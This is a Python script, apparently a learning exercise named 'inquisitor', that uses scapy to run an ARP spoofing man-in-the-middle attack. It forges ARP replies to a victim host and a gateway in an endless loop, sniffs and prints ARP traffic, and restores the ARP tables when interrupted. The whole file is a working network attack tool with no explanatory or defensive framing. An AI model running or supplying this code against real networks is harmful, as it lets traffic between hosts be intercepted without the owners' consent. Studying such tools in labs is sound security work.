# inquisitor.py
import sys
import signal
from scapy.all import ARP, Ether, send, sniff, wrpcap

def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac):
    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac), count=3)

def arp_poison(victim_ip, victim_mac, gateway_ip, gateway_mac):
    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip))
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip))

def packet_sniffer(packet):
    if packet.haslayer(ARP):
        print(packet.summary())

def signal_handler(sig, frame):
    print("Restoring ARP tables...")
    restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
    sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python inquisitor.py <IP-src> <MAC-src> <IP-target> <MAC-target>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    victim_mac = sys.argv[2]
    gateway_ip = sys.argv[3]
    gateway_mac = sys.argv[4]

    signal.signal(signal.SIGINT, signal_handler)

    print("Starting ARP spoofing...")
    while True:
        arp_poison(victim_ip, victim_mac, gateway_ip, gateway_mac)
        sniff(prn=packet_sniffer, filter="arp", store=0, count=10)